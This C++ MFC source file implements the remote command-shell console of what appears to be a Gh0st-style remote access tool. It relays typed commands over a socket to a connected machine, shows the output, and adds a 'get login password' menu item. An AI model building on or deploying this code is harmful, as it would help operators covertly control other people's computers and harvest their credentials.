// CShellDlg.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CShellDlg.h"
#include "afxdialogex.h"
#include"..\..\common\macros.h"
#define IDM_GET_SYSPSWD		0x0010

// CShellDlg 对话框

IMPLEMENT_DYNAMIC(CShellDlg, CDialog)

CShellDlg::CShellDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(IDD_SHELL, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_nCurSel = 0;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CMDSHELL));

}

CShellDlg::~CShellDlg()
{

}

BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	USES_CONVERSION;

	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_Edit.m_hWnd)
		{
			int	len = m_Edit.GetWindowTextLength();
			CString str;
			m_Edit.GetWindowText(str);
			str += "\r\n";
			m_iocpServer->Send(
				m_pContext,
				(LPBYTE)A2W(str.GetBuffer(0) + m_nCurSel),
				(str.GetLength() - m_nCurSel) * 2
			);
			m_nCurSel = m_Edit.GetWindowTextLength();
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_Edit.m_hWnd)
		{
			if (m_Edit.GetWindowTextLength() <= m_nReceiveLength)
				return true;
		}
	}
	// Ctrl没按下
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	len = m_Edit.GetWindowTextLength();
		m_Edit.SetSel(len, len);
		// 用户删除了部分内容，改变m_nCurSel
		if (len < m_nCurSel)
			m_nCurSel = len;
	}

	return CDialog::PreTranslateMessage(pMsg);
}




void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDITSHELL, m_Edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_WM_CTLCOLOR()
	ON_EN_CHANGE(IDC_EDITSHELL, &CShellDlg::OnChangeEditshell)
END_MESSAGE_MAP()


// CShellDlg 消息处理程序


BOOL CShellDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_SYSPSWD, "获取登录密码(&P)");
	}


		m_nCurSel = m_Edit.GetWindowTextLength();

		CString str;
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
		str.Format("\\\\%s - Remote Shell", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
		SetWindowText(str);

		m_Edit.SetLimitText(MAXDWORD); // 设置最大长度

		// 通知远程控制端对话框已经打开
		BYTE bToken = COMMAND_NEXT;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
}

void CShellDlg::OnReceiveComplete()
{
	AddKeyBoardData();
	m_nReceiveLength = m_Edit.GetWindowTextLength();
}

void CShellDlg::AddKeyBoardData()
{
	// 最后填上0
	//m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	//CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);

	int nBufLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
	char* lpszBuffer = (char*)malloc(nBufLen);
	RtlZeroMemory(lpszBuffer, nBufLen);

	WideCharToMultiByte(
		CP_ACP,
		WC_COMPOSITECHECK,
		(LPCWSTR)m_pContext->m_DeCompressionBuffer.GetBuffer(0),
		-1,
		lpszBuffer,
		nBufLen / sizeof(WCHAR),
		NULL,
		NULL
	);

	CString strResult = lpszBuffer;

	//去掉我们输入的命令
	strResult = strResult.Right(strResult.GetLength() - strResult.Find("\r"));


	strResult.Replace("\n", "\r\n");
	int	len = m_Edit.GetWindowTextLength();
	m_Edit.SetSel(len, len);
	m_Edit.ReplaceSel(strResult);
	m_nCurSel = m_Edit.GetWindowTextLength();

	free(lpszBuffer);
}

void CShellDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
		// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}


void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	ResizeEdit();
}

void CShellDlg::ResizeEdit()
{
	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	if (m_Edit.GetSafeHwnd() != NULL)
		m_Edit.MoveWindow(&rectEdit);
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	if ((pWnd->GetDlgCtrlID() == IDC_EDITSHELL) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}


void CShellDlg::OnChangeEditshell()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialog::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。
	int len = m_Edit.GetWindowTextLength();
	if (len < m_nCurSel)
		m_nCurSel = len;
	// TODO:  在此添加控件通知处理程序代码
}
